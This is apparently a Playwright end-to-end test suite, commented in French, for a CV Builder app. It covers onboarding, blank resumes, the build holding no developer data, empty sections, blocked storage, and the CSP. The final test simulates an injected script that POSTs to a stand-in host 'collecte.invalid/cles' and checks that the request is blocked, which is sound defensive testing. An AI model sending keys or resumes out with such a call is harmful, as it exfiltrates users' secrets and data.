import fs from 'node:fs';
import path from 'node:path';
import { test, expect, developerMarkers, STORAGE_KEY } from './support/fixtures.js';

// a) Premier lancement : écran d'accueil, puis un CV vierge sans rien du développeur.

test('premier lancement : accueil, rien n’est enregistré avant le choix', async ({ page, app }) => {
  await app.open();
  await expect(page.getByRole('heading', { name: 'Bienvenue ! Par quoi commençons-nous ?' })).toBeVisible();
  await expect(page).toHaveTitle('CV Builder');
  for (const choice of ['Commencer de zéro', 'Charger l’exemple', 'Importer un fichier JSON']) {
    await expect(page.getByRole('button', { name: new RegExp(choice) })).toBeVisible();
  }
  // Ni barre d'outils ni éditeur tant qu'aucun choix n'est fait.
  await expect(app.toolbar).toHaveCount(0);
  await page.waitForTimeout(800);
  expect(await page.evaluate((key) => localStorage.getItem(key), STORAGE_KEY)).toBeNull();
});

test('« Commencer de zéro » ouvre un CV vierge, sans trace du développeur ni rubrique vide', async ({ page, app }) => {
  await app.startBlank();
  await expect(app.toolbar).toBeVisible();
  await expect(app.versionButton).toContainText('Mon CV');

  // Formulaire vide.
  for (const id of ['ed-pi-name', 'ed-pi-title', 'ed-pi-email', 'ed-pi-phone', 'ed-pi-location']) {
    await expect(page.locator(`#${id}`)).toHaveValue('');
  }

  // Aperçu design : aucun titre de section, aucune puce, aucune image, aucun texte.
  const checkEmpty = async () => {
    await expect(app.resume.locator('h1, h2, h3, li, img, a')).toHaveCount(0);
    expect((await app.resume.textContent()).trim()).toBe('');
  };
  await checkEmpty();
  await expect(app.pageBadge).toHaveText('1 page');

  // Même chose avec le modèle ATS.
  await app.setTemplate('ATS (sobre)');
  await checkEmpty();

  // Rien du développeur dans la page, ni à l'écran ni dans le HTML.
  const html = (await page.content()).toLowerCase();
  for (const marker of developerMarkers()) {
    expect(html, `« ${marker} » ne doit pas apparaître`).not.toContain(marker.toLowerCase());
  }

  // Le CV vierge est enregistré tel quel.
  const library = await app.waitForSaved((lib) => lib?.cvs?.length === 1);
  const { personalInfo, experiences, mainSkills, education } = library.cvs[0].data;
  expect(Object.values(personalInfo).every((v) => v === '')).toBe(true);
  expect([experiences, mainSkills, education].every((list) => list.length === 0)).toBe(true);
  await expect(page).toHaveTitle('CV');
});

test('l’application construite ne contient ni les données ni la photo du développeur', async () => {
  const dist = process.env.E2E_DIST_DIR;
  const files = fs.readdirSync(dist, { recursive: true }).map((f) => path.join(dist, String(f)));
  const texts = files.filter((f) => /\.(js|css|html|json|txt|svg)$/.test(f));
  expect(texts.length).toBeGreaterThan(0);
  const markers = developerMarkers().map((m) => m.toLowerCase());
  for (const file of texts) {
    const content = fs.readFileSync(file, 'utf8').toLowerCase();
    for (const marker of markers) expect(content, `${path.basename(file)} contient « ${marker} »`).not.toContain(marker);
    expect(content, `${path.basename(file)} embarque une photo`).not.toContain('data:image/jpeg;base64');
  }
  expect(files.filter((f) => /\.(jpe?g|png|webp|heic)$/i.test(f)), 'aucune image dans le build').toEqual([]);
});

test('des éléments ajoutés mais laissés vides n’affichent aucune rubrique sur le CV', async ({ page, app }) => {
  await app.startBlank();
  await app.openPanel('profile');
  await page.locator('#ed-profile-objective').fill('   ');

  const skills = await app.openPanel('skills');
  await skills.getByRole('button', { name: 'Ajouter un groupe de compétences' }).click();
  await skills.getByLabel('Nom du groupe (facultatif)').fill('Logiciels');

  const exp = await app.openPanel('experiences');
  await exp.getByRole('button', { name: 'Ajouter une expérience' }).click();
  await expect(exp.locator('textarea.detail-input')).toHaveCount(1);

  const edu = await app.openPanel('education');
  await edu.getByRole('button', { name: 'Ajouter une formation' }).click();
  await edu.getByRole('button', { name: 'Outils', exact: true }).click();

  const links = await app.openPanel('links');
  await links.getByRole('button', { name: 'Ajouter un lien' }).click();
  await links.getByLabel('Nom du lien').fill('LinkedIn');

  await (await app.openPanel('languages')).getByRole('button', { name: 'Ajouter une langue' }).click();
  await (await app.openPanel('certifications')).getByRole('button', { name: 'Ajouter une certification' }).click();

  await page.getByRole('button', { name: 'Ajouter une section libre' }).click();
  await page.locator('.editor-section-panel').last().getByLabel('Titre de la section', { exact: true }).fill('Permis');

  // L'éditeur signale ces sections comme vides…
  await expect(page.locator('#ed-panel-experiences .editor-meta-empty')).toHaveText('Vide : n\'apparaît pas sur le CV');
  // … et le CV n'affiche ni titre orphelin, ni puce vide, ni séparateur.
  for (const template of ['Design', 'ATS (sobre)']) {
    await app.setTemplate(template);
    await expect(app.resume.locator('h1, h2, h3, li, a, img')).toHaveCount(0);
    expect((await app.resume.textContent()).trim(), template).toBe('');
  }
});

test('stockage du site interdit par le navigateur : l’application démarre quand même et prévient', async ({ page, app }) => {
  // Réglage Chrome « Ne pas autoriser les sites à enregistrer des données » : lire localStorage lève une SecurityError.
  await page.addInitScript(() => {
    Object.defineProperty(window, 'localStorage', {
      configurable: true,
      get() {
        throw new DOMException("Failed to read the 'localStorage' property from 'Window': Access is denied for this document.", 'SecurityError');
      },
    });
  });
  await app.open();
  await expect(page.getByRole('heading', { name: 'Bienvenue ! Par quoi commençons-nous ?' })).toBeVisible();
  await expect(page.locator('.crash-screen')).toHaveCount(0);

  await page.getByRole('button', { name: /Charger l’exemple/ }).click();
  await expect(app.resume.locator('h1')).toHaveText('Camille Martin');
  // Le travail continue en mémoire ; l'indicateur propose d'exporter une sauvegarde.
  await page.locator('#ed-pi-title').fill('Chargée de communication');
  await expect(app.toolbar.getByRole('button', { name: 'Enregistrement impossible : exportez une sauvegarde' })).toBeVisible();
  await expect(app.resume.locator('.profile-title')).toHaveText('Chargée de communication');
  const download = await app.download(() =>
    app.toolbar.getByRole('button', { name: 'Enregistrement impossible : exportez une sauvegarde' }).click(),
  );
  expect(download.name).toMatch(/^CV_Builder_sauvegarde_\d{4}-\d{2}-\d{2}\.json$/);
  expect(JSON.parse(download.text()).cvs[0].data.personalInfo.title).toBe('Chargée de communication');
});

test('le site est servi avec sa politique de sécurité : seuls les API d’IA sont joignables', async ({ page, app, consoleGuard }) => {
  consoleGuard.allow(/collecte\.invalid/);
  const response = await page.goto('/');
  const csp = response.headers()['content-security-policy'];
  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain('connect-src');
  await page.getByRole('button', { name: /Charger l’exemple/ }).click();
  await expect(app.resume.locator('h1')).toHaveText('Camille Martin');
  // Un script injecté ne pourrait pas envoyer les clés ou le CV vers un autre serveur.
  const outcome = await page.evaluate(() =>
    fetch('https://collecte.invalid/cles', { method: 'POST', body: 'x' }).then(
      () => 'envoyé',
      () => 'bloqué',
    ),
  );
  expect(outcome).toBe('bloqué');
});
